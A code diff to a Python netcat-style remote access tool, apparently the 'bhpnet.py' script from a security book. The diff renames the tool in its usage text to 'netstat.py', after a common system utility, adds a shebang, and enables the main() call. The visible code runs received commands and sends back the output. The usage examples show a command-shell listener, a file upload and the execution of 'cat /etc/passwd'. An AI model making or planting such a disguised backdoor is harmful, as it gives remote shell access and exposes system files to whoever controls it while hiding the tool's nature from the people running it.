@@ -1,3 +1,4 @@
+#!/usr/bin/env python
 import sys
 import socket
 import getopt
@@ -25,10 +26,10 @@ def usage():
 	print
 	print
 	print "Examples: "
-	print "bhpnet.py -t 192.168.0.1 -p 5555 -l -c"
-	print "bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"
-	print "bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
-	print "echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135"
+	print "netstat.py -t 192.168.0.1 -p 5555 -l -c"
+	print "netstat.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"
+	print "netstat.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
+	print "echo 'ABCDEFGHI' | ./netstat.py -t 192.168.11.12 -p 135"
 	sys.exit(0)
 
 def main():
@@ -77,7 +78,6 @@ def main():
 	if listen:
 		server_loop()
 
-# main()
 
 def client_sender(buffer):
 	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -178,3 +178,4 @@ def client_handler(client_socket):
 				response = run_command(cmd_buffer)
 				# send back the response
 				client_socket.send(response)
+main()
